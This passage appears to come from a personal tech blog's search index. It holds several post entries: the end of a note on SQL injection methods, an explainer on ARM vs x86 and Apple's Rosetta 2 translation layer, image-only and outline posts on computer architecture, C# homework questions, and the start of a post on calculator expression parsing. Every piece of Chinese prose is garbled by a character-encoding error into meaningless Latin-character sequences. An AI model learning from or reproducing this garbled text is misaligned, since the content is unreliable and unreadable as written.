·åš</p><p>æ€ä¹ˆéƒ½æœ‰æŠ¥é”™å›æ˜¾ã€‚å¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨æœ‰ç‚¹æš´åŠ›æœ‰ç‚¹çº¯ã€‚ä½¿ç”¨sqlmapä¼šå¥½å¾—å¤šä½†æ˜¯æˆ‘æš‚æ—¶ä¸ä¼šç”¨</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è‹¹æœçš„ç½—å¡å¡”çŸ³ç¢‘ â€”â€” Rosetta 2</title>
      <link href="/2024/11/09/Rosetta/"/>
      <url>/2024/11/09/Rosetta/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="ARMæ¶æ„ä¸x86æ¶æ„"><a href="#ARMæ¶æ„ä¸x86æ¶æ„" class="headerlink" title="ARMæ¶æ„ä¸x86æ¶æ„"></a>ARMæ¶æ„ä¸x86æ¶æ„</h2><p><strong>æŒ‡ä»¤é›†æ¶æ„ï¼ˆISA</strong>ï¼‰æ˜¯è®¡ç®—æœºç¡¬ä»¶ä¸è½¯ä»¶ä¹‹é—´çš„æ¥å£è§„èŒƒï¼Œå®šä¹‰äº†å¤„ç†å™¨å¯ä»¥æ‰§è¡Œçš„åŸºæœ¬æŒ‡ä»¤ï¼ˆå¦‚ç®—æœ¯è¿ç®—ã€æ•°æ®ä¼ è¾“ã€æ§åˆ¶è½¬ç§»ç­‰ï¼‰ã€æŒ‡ä»¤æ ¼å¼ã€å¯»å€æ¨¡å¼ä»¥åŠç›¸å…³çš„å¯„å­˜å™¨å’Œæ•°æ®ç±»å‹ã€‚ç®€å•æ¥è¯´ï¼Œå®ƒå°±åƒæ˜¯å¤„ç†å™¨çš„â€œè¯­è¨€â€ï¼ˆ<strong>CPUé¢„å®šä¹‰çš„æ“ä½œå’Œè®¡ç®—</strong>ï¼‰ï¼Œè®©ç¨‹åºå‘˜èƒ½å¤Ÿç¼–å†™å¯ä»¥åœ¨ç‰¹å®šæ¶æ„ä¸Šè¿è¡Œçš„è½¯ä»¶ï¼ŒåŒæ—¶ä¹Ÿå¸®åŠ©è®¾è®¡å¤„ç†å™¨çš„å·¥ç¨‹å¸ˆç†è§£å¦‚ä½•å®ç°è¿™äº›æŒ‡ä»¤ï¼ˆç®€åŒ–ç¨‹åºå‘˜çš„å·¥ä½œï¼‰ã€‚</p><p>é‚£å¦‚æœè¦ç®€åŒ–ç¨‹åºå‘˜çš„å·¥ä½œï¼Œè¿™æ„å‘³ç€å¾®å¤„ç†å™¨çš„å·¥ä½œååˆ†å¤æ‚ã€‚<del>ç”²æ–¹åªéœ€è¦æè¦æ±‚å°±å¥½äº†ï¼Œè€Œä¹™æ–¹éœ€è¦è€ƒè™‘çš„å°±å¤šäº†ã€‚</del>é‚£åˆ°åº•æ˜¯åº”è¯¥ç®€åŒ–ç¨‹åºå‘˜çš„å·¥ä½œï¼Œè¿˜æ˜¯ç®€åŒ–å¾®å¤„ç†å™¨çš„å·¥ä½œï¼Ÿ</p><p>ç”±æ­¤äº§ç”Ÿäº†ä¸¤ç§æƒ³æ³•ï¼š<strong>CISC</strong> å’Œ <strong>RISC</strong></p><p><strong>x86</strong>ï¼š<strong>åŸºäºCISCçš„å¤„ç†å™¨æ¶æ„</strong>ï¼Œæ‹¥æœ‰éå¸¸ä¸°å¯Œçš„æŒ‡ä»¤é›†ã€‚ä¸€æ¡æŒ‡ä»¤å¯ä»¥å®Œæˆæ•´ä¸ªè®¡ç®—ï¼ˆå¦‚ä¹˜æ³•ï¼‰æˆ–å°†ä¸€å—æ•°æ®ç›´æ¥ä»å†…å­˜ä¸­çš„ä¸€ä¸ªä½ç½®ç§»åŠ¨åˆ°å¦ä¸€ä¸ªä½ç½®ï¼Œå¹¶ä¸”è¿™ä¸€ç³»åˆ—å¤æ‚çš„æ“ä½œå¯ä»¥åœ¨ä¸€ä¸ªå‘¨æœŸå†…å®Œæˆã€‚ä½†è¿™ä¹Ÿæ„å‘³ç€å®ƒéœ€è¦æ›´å¤šçš„æ™¶ä½“ç®¡ï¼Œä»è€Œä¼šå ç”¨æ§ä»¶å¹¶æ¶ˆè€—èƒ½é‡ã€‚</p><p><strong>ARM</strong>ï¼š<strong>åŸºäºRISCçš„å¤„ç†å™¨æ¶æ„</strong>ï¼Œæ¯æ¡æŒ‡ä»¤ä»…ä»£è¡¨ä¸€ä¸ªèƒ½è€—è¾ƒä½çš„ç®€å•æ“ä½œã€‚è¿™ä½¿å¾—æ±‡ç¼–è¯­è¨€ç¨‹åºå‘˜çš„å·¥ä½œå˜å¾—æ›´åŠ å¤æ‚ï¼Œä½†å´ç®€åŒ–äº†å¤„ç†å™¨çš„å·¥ä½œã€‚åˆ©ç”¨RISCå¤„ç†å™¨å’Œå…ˆè¿›çš„RISCè®¡ç®—æœºï¼Œå¯ä»¥é€šè¿‡è¿è¡Œå¤šæ¡æŒ‡ä»¤æˆ–é€šè¿‡å°†å¤æ‚å·¥ä½œæ¨ç»™ç¼–è¯‘å™¨ï¼ˆè€Œä¸æ˜¯CPUå†…æ ¸ï¼‰æ¥æ‰§è¡Œå¤æ‚å·¥ä½œã€‚</p><p>ä¸¤ç§CPUè®¾è®¡éƒ½å…·æœ‰é«˜æ€§èƒ½ï¼Œä½†ARMè®¾è®¡å¾€å¾€ä¾§é‡äºæ›´å°å·§çš„å¤–å½¢ã€ç”µæ± ä½¿ç”¨æ—¶é—´ã€å°ºå¯¸ã€å…é™¤æ•£çƒ­è¦æ±‚å’Œæˆæœ¬ã€‚</p><p>å…·ä½“å¯è§ <a href="https://pocon041.github.io/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/">æŒ‡ä»¤ç³»ç»Ÿ | Poconâ€™s Blog</a></p><hr><h2 id="Macå‘AppleèŠ¯ç‰‡è¿ç§»"><a href="#Macå‘AppleèŠ¯ç‰‡è¿ç§»" class="headerlink" title="Macå‘AppleèŠ¯ç‰‡è¿ç§»"></a>Macå‘AppleèŠ¯ç‰‡è¿ç§»</h2><p>åœ¨2020å¹´6æœˆ22æ—¥çš„è‹¹æœå…¨çƒå¼€å‘è€…å¤§ä¼šä¸Šï¼Œè‹¹æœå…¬å¸CEOè’‚å§†Â·åº“å…‹å®£å¸ƒå°†Macç”µè„‘ä»è‹±ç‰¹å°”çš„x86-64çš„å¤„ç†å™¨å¹³å°è¿ç§»è‡³ARM64æ¶æ„çš„AppleèŠ¯ç‰‡ï¼ˆç”±è‹¹æœè‡ªè¡Œè®¾è®¡çš„å¤„ç†å™¨ï¼‰ã€‚ï¼ˆåœ¨æ­¤ä¹‹å‰ä¹Ÿæœ‰è¿‡è¿ç§»ç»å†ï¼‰</p><p>æ—¢ç„¶æ˜¯ä¸¤ç§ä¸åŒçš„æŒ‡ä»¤é›†æ¶æ„ï¼Œè‹¹æœæ˜¯å¦‚ä½•å®ç°è®©Intelå¹³å°ä¸Šå¼€å‘çš„è½¯ä»¶åœ¨ARMæ¶æ„å¹³å°çš„Macä¸Šé¡ºåˆ©è¿è¡Œçš„å‘¢ï¼Ÿ</p><hr><h2 id="Rosetta-2"><a href="#Rosetta-2" class="headerlink" title="Rosetta 2"></a>Rosetta 2</h2><p>åœ¨æ­¤ä¹‹å‰ï¼Œå…ˆè®©æˆ‘è®²è®²å¦ä¸€ç§å®ç°æœºåˆ¶ï¼š<strong>é€šç”¨äºŒè¿›åˆ¶</strong></p><p>é€šç”¨äºŒè¿›åˆ¶æ˜¯ä¸€ç§å°†å¤šä¸ªæ¶æ„çš„ä»£ç æ‰“åŒ…åœ¨åŒä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æŠ€æœ¯ã€‚ï¼ˆç”±äºè¿™äº›å¤šå¹³å°å¯æ‰§è¡Œç¨‹åºæ–‡ä»¶å®¹é‡æ¯”åŸæ¥è¦å¤§ï¼Œæ‰€ä»¥ä¹Ÿç§°ä¸º<strong>èƒ–äºŒè¿›åˆ¶</strong>ã€‚ï¼‰è¯¥æ–‡ä»¶åŒ…å«é’ˆå¯¹ä¸åŒæ¶æ„çš„æœºå™¨ä»£ç ï¼Œæ“ä½œç³»ç»Ÿåœ¨è¿è¡Œæ—¶æ ¹æ®ç¡¬ä»¶æ¶æ„é€‰æ‹©åˆé€‚çš„ä»£ç æ®µæ‰§è¡Œã€‚</p><p>æ¢è€Œè¨€ä¹‹ï¼Œä¹Ÿå°±æ˜¯æä¾›å¤šä¸ªç¿»è¯‘ç‰ˆæœ¬ï¼Œé€‰ä½ çœ‹å¾—æ‡‚çš„é‚£ä¸ªã€‚</p><blockquote><p>[!WARNING]</p><p>ä»¥ä¸‹ä¸ºä¸ªäººè§è§£</p></blockquote><p>åˆ¶ä½œå’Œä¼˜åŒ–å…¶åº”ç”¨çš„ARMç‰ˆæœ¬éœ€è¦æ—¶é—´ã€‚åˆ›å»ºé€šç”¨äºŒè¿›åˆ¶æ–‡ä»¶éœ€è¦å¯¹æºä»£ç è¿›è¡Œä¿®æ”¹å’Œæµ‹è¯•ï¼Œå› æ­¤å¼€å‘çš„å¤æ‚æ€§ä¼šå¤§å¹…æå‡ã€‚ä¸ºäº†æä¾›æ›´çµæ´»ä½¿ç”¨çš„è§£å†³æ–¹æ¡ˆï¼Œåœ¨å½“æ—¶<strong>Rosetta</strong>æˆä¸ºä¸»æµï¼Œè€Œé€šç”¨äºŒè¿›åˆ¶ç‰ˆæœ¬éœ€è¦æ›´é•¿çš„æ—¶é—´æ¥æ¨å¹¿å’Œæ™®åŠã€‚</p><p>æ¢è€Œè¨€ä¹‹ï¼Œä¸¤ä¸ªå›½å®¶çš„äººï¼ˆIntelå’ŒSiliconï¼‰è¯´çš„æ˜¯ä¸åŒçš„è¯­è¨€ï¼Œå½¼æ­¤å¬ä¸æ‡‚å¯¹æ–¹çš„è¯ï¼Œè¿˜å¥½çš„æ˜¯éƒ½æ˜¯ç”¨å˜´è¯´ï¼Œå£°éŸ³é€šè¿‡ç©ºæ°”ä¼ æ’­ï¼Œåˆ«äººä¹Ÿéƒ½æ˜¯ç”¨è€³æœµå¬çš„ã€‚é‚£ä¹ˆï¼Œä¸­é—´æœ‰ä¸ªç¿»è¯‘ï¼ˆRosettaï¼‰ï¼Œå¯ä»¥æŠŠä¸€ç§è¯­è¨€ç¿»è¯‘æˆå¦å¤–ä¸€ç§ã€‚</p><p><strong>Rosetta</strong>ï¼šä¸€ç§åŠ¨æ€ç¿»è¯‘å·¥å…·ã€‚å…è®¸å·²ç»å­˜åœ¨çš„Intel x86åº”ç”¨åœ¨Apple Siliconï¼ˆARMæ¶æ„ï¼‰ä¸Šè¿è¡Œï¼Œè€Œæ— éœ€å¼€å‘è€…é‡æ–°ç¼–è¯‘æˆ–å‘å¸ƒæ–°çš„ç‰ˆæœ¬ã€‚è¿™ä½¿å¾—ç”¨æˆ·èƒ½å¤Ÿç«‹å³ç»§ç»­ä½¿ç”¨ä»–ä»¬çš„æ—§è½¯ä»¶ï¼Œæ— ç¼è¿‡æ¸¡åˆ°æ–°ç¡¬ä»¶ä¸Šã€‚</p><p>è‹¹æœå…¬å¸å£°ç§°ï¼šé‚£äº›é‡è§†ç”¨æˆ·äº’åŠ¨è€Œè¾ƒå°‘è®¡ç®—é‡çš„åº”ç”¨ç¨‹åºï¼ˆæ¯”å¦‚wordç­‰æ–‡å­—å¤„ç†å™¨ï¼‰æ˜¯æ¯”è¾ƒé€‚åˆåŒå½’å“¦Rosettaç¼–è¯‘çš„ï¼›è€Œéœ€è¦å¤§è®¡ç®—é‡çš„ç¨‹åºï¼Œæ¯”å¦‚Photoshopéœ€è¦å¦å¤–çš„é€šç”¨äºŒè¿›åˆ¶ç‰ˆæœ¬ã€‚</p><p><strong>Rosetta 2</strong>ï¼šRosetta 2é¢„è£…åœ¨ä½¿ç”¨Apple SiliconèŠ¯ç‰‡çš„Macç”µè„‘çš„æ“ä½œç³»ç»Ÿä¸Šã€‚å®ƒå¯ä»¥å°†AMD64æŒ‡ä»¤è¿›è¡Œç¿»è¯‘ã€‚ä¸Rosettaä¸åŒçš„æ˜¯ï¼ŒRosetta 2åœ¨å®‰è£…è½¯ä»¶æ—¶ä¼šæŠŠIntelç‰ˆæœ¬ç¨‹åºè½¬åŒ–ä¸ºARMç¨‹åºï¼ŒåŠ ä¸ŠAppleçš„å¤„ç†å™¨æ€§èƒ½å¾ˆé«˜ï¼Œå› æ­¤å³ä½¿éœ€è¦å¤§è®¡ç®—é‡çš„ç¨‹åºï¼Œé€šè¿‡  Rosetta 2ç¼–è¯‘ä¹Ÿèƒ½æµç•…åœ°æ‰§è¡Œã€‚ï¼ˆIntelç‰ˆæœ¬Macæ“ä½œç³»ç»Ÿä¸Šåœ°åº”ç”¨ç¨‹åºï¼‰</p><p>è®©æˆ‘ä»¬ï¼ˆæµ…æ˜¾çš„ï¼‰æ·±å…¥æ¢è®¨ä¸€ä¸‹åº•å±‚åŸå› ï¼š</p><ol><li>å°½ç®¡æŒ‡ä»¤é›†ä¸åŒï¼ŒARMå’ŒIntelåº•å±‚æ¶æ„æœ‰è¾ƒé«˜ç›¸ä¼¼åº¦ï¼ˆå…·ä½“æˆ‘ä¸çŸ¥é“ä¸ºå•¥ï¼‰ã€‚x86æŒ‡ä»¤é›†è™½ç„¶å¤æ‚ï¼Œä½†Rosetta 2åªéœ€è¦æ”¯æŒå…¶ä¸­çš„å­é›†ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·æ€æŒ‡ä»¤ã€‚å¹¶ä¸”ä¸¤å¥—æŒ‡ä»¤éƒ½æ˜¯å°ç«¯å­˜å‚¨ã€‚</li><li>æœ€å¤§éšœç¢æ˜¯å†…å­˜æ’åºï¼ˆå†…å­˜ä¸€è‡´æ€§æ¨¡å‹ä¸ä¸€æ ·ï¼‰ï¼Œå³ä¸¤ä¸ªCPUåœ¨å†…å­˜ä¸­çœ‹åˆ°å½¼æ­¤ä¿®æ”¹çš„é¡ºåºä¸ä¸€æ ·ã€‚æ‰€ä»¥è‹¹æœå°†Intelçš„å†…å­˜æ’åºæ·»åŠ åˆ°ä»–ä»¬çš„CPUä¸­<del>ï¼ˆè¿™ä¹Ÿå¤ªæš´åŠ›äº†ï¼‰</del>ã€‚åœ¨è¿è¡Œè½¬æ¢åçš„x86ä»£ç æ—¶ï¼Œå®ƒä»¬ä¼šé€šè¿‡ä¸€ä¸ªåé—¨å¼€å…³åˆ‡æ¢CPUçš„æ¨¡å¼ä»¥ç¬¦åˆIntelçš„å†…å­˜æ’åºã€‚</li></ol><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.redhat.com/zh/topics/linux/ARM-vs-x86">https://www.redhat.com/zh/topics/linux/ARM-vs-x86</a></p><p><a href="https://zh.wikipedia.org/wiki/Mac%E5%90%91Apple%E8%8A%AF%E7%89%87%E8%BF%81%E7%A7%BB">Macå‘AppleèŠ¯ç‰‡è¿ç§» - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></p><p><a href="https://zh.wikipedia.org/wiki/Rosetta">Rosetta - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></p><p><a href="https://www.v2ex.com/t/726640">å“ªä½è€å“¥èƒ½è§£é‡Šä¸€ä¸‹ Rosetta çš„å®ç°åŸç†ï¼Ÿ - V2EX</a></p><p><a href="https://www.bilibili.com/opus/850506105874284549">ã€è½¬ã€‘è‹¹æœçš„ Rosetta 2 çš„å®ç°åŸç†å¤§æ¦‚æ˜¯æ€æ ·çš„ï¼Ÿ - å“”å“©å“”å“©</a></p><p><a href="https://juejin.cn/post/6978804300768083976#heading-0">https://juejin.cn/post/6978804300768083976#heading-0</a></p><p><a href="https://x.com/ErrataRob/status/1331750197836345345">(20) Robert Graham ğ• on X: â€œ19&#x2F; â€¦even when translating x86 code, all that reference counting overhead (already more efficient than garbage collection) gets dropped in half. Yet another weird performance enhance to add to all the others.â€ &#x2F; X</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98%E6%8E%92%E5%BA%8F">å†…å­˜æ’åº - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç»„æˆä¸ç³»ç»Ÿç»“æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŒ‡ä»¤ç³»ç»Ÿ</title>
      <link href="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-zhiling1.png" alt="zhiling1"></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling2.png" alt="zhiling2"></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling3.png" alt="zhiling3"></p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/zhiling4.png" alt="zhiling4"></p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç»„æˆä¸ç³»ç»Ÿç»“æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç³»ç»Ÿç»“æ„</title>
      <link href="/2024/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
      <url>/2024/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="è®¡ç®—æœºç³»ç»Ÿç»“æ„"><a href="#è®¡ç®—æœºç³»ç»Ÿç»“æ„" class="headerlink" title="è®¡ç®—æœºç³»ç»Ÿç»“æ„"></a>è®¡ç®—æœºç³»ç»Ÿç»“æ„</h1><h2 id="æŒ‡ä»¤é›†æ¶æ„"><a href="#æŒ‡ä»¤é›†æ¶æ„" class="headerlink" title="æŒ‡ä»¤é›†æ¶æ„"></a>æŒ‡ä»¤é›†æ¶æ„</h2><h2 id="å¾®ä½“ç³»æ¶æ„"><a href="#å¾®ä½“ç³»æ¶æ„" class="headerlink" title="å¾®ä½“ç³»æ¶æ„"></a>å¾®ä½“ç³»æ¶æ„</h2><h2 id="æ•°æ®è¡¨è¾¾"><a href="#æ•°æ®è¡¨è¾¾" class="headerlink" title="æ•°æ®è¡¨è¾¾"></a>æ•°æ®è¡¨è¾¾</h2><h2 id="å¯»å€æ–¹å¼"><a href="#å¯»å€æ–¹å¼" class="headerlink" title="å¯»å€æ–¹å¼"></a>å¯»å€æ–¹å¼</h2><h2 id="å¯„å­˜å™¨å®šä¹‰"><a href="#å¯„å­˜å™¨å®šä¹‰" class="headerlink" title="å¯„å­˜å™¨å®šä¹‰"></a>å¯„å­˜å™¨å®šä¹‰</h2><h2 id="æŒ‡ä»¤ç³»ç»Ÿ"><a href="#æŒ‡ä»¤ç³»ç»Ÿ" class="headerlink" title="æŒ‡ä»¤ç³»ç»Ÿ"></a>æŒ‡ä»¤ç³»ç»Ÿ</h2><p>â€‹<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241106160537615.png" alt="image-20241106160537615"></p><p>â€‹<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241106160557265.png" alt="image-20241106160557265"></p><p>â€‹<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241106160618550.png" alt="image-20241106160618550"></p><h2 id="å¼‚å¸¸æœºåˆ¶"><a href="#å¼‚å¸¸æœºåˆ¶" class="headerlink" title="å¼‚å¸¸æœºåˆ¶"></a>å¼‚å¸¸æœºåˆ¶</h2><h2 id="æœºå™¨å·¥ä½œçŠ¶æ€"><a href="#æœºå™¨å·¥ä½œçŠ¶æ€" class="headerlink" title="æœºå™¨å·¥ä½œçŠ¶æ€"></a>æœºå™¨å·¥ä½œçŠ¶æ€</h2><h2 id="è¾“å…¥è¾“å‡ºç»“æ„"><a href="#è¾“å…¥è¾“å‡ºç»“æ„" class="headerlink" title="è¾“å…¥è¾“å‡ºç»“æ„"></a>è¾“å…¥è¾“å‡ºç»“æ„</h2>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç»„æˆä¸ç³»ç»Ÿç»“æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cè‰¹åŸºç¡€ï¼ˆ1ï¼‰</title>
      <link href="/2024/11/05/C-%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/11/05/C-%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="ä¿¡æ¯ç³»ç»Ÿå¼€å‘ï¼ˆ-NETï¼‰-ç¬¬å…«ç« ä½œä¸š"><a href="#ä¿¡æ¯ç³»ç»Ÿå¼€å‘ï¼ˆ-NETï¼‰-ç¬¬å…«ç« ä½œä¸š" class="headerlink" title="ä¿¡æ¯ç³»ç»Ÿå¼€å‘ï¼ˆ.NETï¼‰   ç¬¬å…«ç« ä½œä¸š"></a>ä¿¡æ¯ç³»ç»Ÿå¼€å‘ï¼ˆ.NETï¼‰   ç¬¬å…«ç« ä½œä¸š</h1><h2 id="ä»€ä¹ˆæ˜¯ç±»çš„ç»§æ‰¿ï¼Ÿæ€ä¹ˆå®šä¹‰æ´¾ç”Ÿç±»ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç±»çš„ç»§æ‰¿ï¼Ÿæ€ä¹ˆå®šä¹‰æ´¾ç”Ÿç±»ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç±»çš„ç»§æ‰¿ï¼Ÿæ€ä¹ˆå®šä¹‰æ´¾ç”Ÿç±»ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ç±»çš„ç»§æ‰¿ï¼Ÿæ€ä¹ˆå®šä¹‰æ´¾ç”Ÿç±»ï¼Ÿ</h2><h2 id="ç®€è¿°åˆ›å»ºæ´¾ç”Ÿç±»æ—¶ï¼Œæ„é€ å‡½æ•°çš„è°ƒç”¨ã€‚"><a href="#ç®€è¿°åˆ›å»ºæ´¾ç”Ÿç±»æ—¶ï¼Œæ„é€ å‡½æ•°çš„è°ƒç”¨ã€‚" class="headerlink" title="ç®€è¿°åˆ›å»ºæ´¾ç”Ÿç±»æ—¶ï¼Œæ„é€ å‡½æ•°çš„è°ƒç”¨ã€‚"></a>ç®€è¿°åˆ›å»ºæ´¾ç”Ÿç±»æ—¶ï¼Œæ„é€ å‡½æ•°çš„è°ƒç”¨ã€‚</h2><h2 id="æ€æ ·å®šä¹‰åŸºç±»è™šæ–¹æ³•ï¼Œå¹¶åœ¨æ´¾ç”Ÿç±»ä¸­é‡å†™åŸºç±»è™šæ–¹æ³•ï¼Ÿ"><a href="#æ€æ ·å®šä¹‰åŸºç±»è™šæ–¹æ³•ï¼Œå¹¶åœ¨æ´¾ç”Ÿç±»ä¸­é‡å†™åŸºç±»è™šæ–¹æ³•ï¼Ÿ" class="headerlink" title="æ€æ ·å®šä¹‰åŸºç±»è™šæ–¹æ³•ï¼Œå¹¶åœ¨æ´¾ç”Ÿç±»ä¸­é‡å†™åŸºç±»è™šæ–¹æ³•ï¼Ÿ"></a>æ€æ ·å®šä¹‰åŸºç±»è™šæ–¹æ³•ï¼Œå¹¶åœ¨æ´¾ç”Ÿç±»ä¸­é‡å†™åŸºç±»è™šæ–¹æ³•ï¼Ÿ</h2><h2 id="æŠ½è±¡æ–¹æ³•å’Œè™šæ–¹æ³•æœ‰ä»€ä¹ˆå¼‚åŒï¼Ÿ"><a href="#æŠ½è±¡æ–¹æ³•å’Œè™šæ–¹æ³•æœ‰ä»€ä¹ˆå¼‚åŒï¼Ÿ" class="headerlink" title="æŠ½è±¡æ–¹æ³•å’Œè™šæ–¹æ³•æœ‰ä»€ä¹ˆå¼‚åŒï¼Ÿ"></a>æŠ½è±¡æ–¹æ³•å’Œè™šæ–¹æ³•æœ‰ä»€ä¹ˆå¼‚åŒï¼Ÿ</h2><h2 id="ä»€ä¹ˆæ˜¯æŠ½è±¡ç±»ï¼Ÿå®ƒæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿå®ƒå’Œæ¥å£æœ‰ä½•å¼‚åŒï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æŠ½è±¡ç±»ï¼Ÿå®ƒæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿå®ƒå’Œæ¥å£æœ‰ä½•å¼‚åŒï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æŠ½è±¡ç±»ï¼Ÿå®ƒæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿå®ƒå’Œæ¥å£æœ‰ä½•å¼‚åŒï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æŠ½è±¡ç±»ï¼Ÿå®ƒæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿå®ƒå’Œæ¥å£æœ‰ä½•å¼‚åŒï¼Ÿ</h2><h2 id="ç®€è¿°é€šè¿‡å§”æ‰˜æ¥è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŸºæœ¬è¿‡ç¨‹ã€‚"><a href="#ç®€è¿°é€šè¿‡å§”æ‰˜æ¥è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŸºæœ¬è¿‡ç¨‹ã€‚" class="headerlink" title="ç®€è¿°é€šè¿‡å§”æ‰˜æ¥è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŸºæœ¬è¿‡ç¨‹ã€‚"></a>ç®€è¿°é€šè¿‡å§”æ‰˜æ¥è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŸºæœ¬è¿‡ç¨‹ã€‚</h2>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—å™¨åŸç†</title>
      <link href="/2024/11/05/c-%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E5%99%A8/"/>
      <url>/2024/11/05/c-%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="è®¡ç®—å™¨åŸç†"><a href="#è®¡ç®—å™¨åŸç†" class="headerlink" title="è®¡ç®—å™¨åŸç†"></a>è®¡ç®—å™¨åŸç†</h1><p>è®¡ç®—å™¨è®¡ç®—çš„è¡¨è¾¾å¼æ˜¯åç¼€è¡¨è¾¾å¼ã€‚</p><p>æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè®¡ç®—å™¨ç»™å‡ºç»“æœä¸»è¦ç»è¿‡äº†ï¼šå°†ä¸­ç¼€è¡¨è¾¾å¼è½¬åŒ–ä¸ºåç¼€è¡¨è¾¾å¼ï¼Œè®¡ç®—åç¼€è¡¨è¾¾å¼è¿™ä¸¤ä¸ªè¿‡ç¨‹</p><p>è€Œè½¬åŒ–å’Œè®¡ç®—è¿‡ç¨‹è¿ç”¨åˆ°äº†æ•°æ®ç»“æ„â€œæ ˆâ€ã€‚</p><p>æˆ‘ä»¬ä¸ºäº†ç®€åŒ–è¿‡ç¨‹ï¼Œåœ¨è½¬åŒ–åç¼€è¡¨è¾¾å¼è¿‡ç¨‹ä¸­è¿›è¡Œä¸­é—´ç»“æœçš„è®¡ç®—ã€‚</p><h3 id="ä¸­ç¼€è¡¨è¾¾å¼"><a href="#ä¸­ç¼€è¡¨è¾¾å¼" class="headerlink" title="ä¸­ç¼€è¡¨è¾¾å¼"></a>ä¸­ç¼€è¡¨è¾¾å¼</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E7%BC%80%E8%A1%A8%E7%A4%BA%E6%B3%95">ä¸­ç¼€è¡¨ç¤ºæ³• - 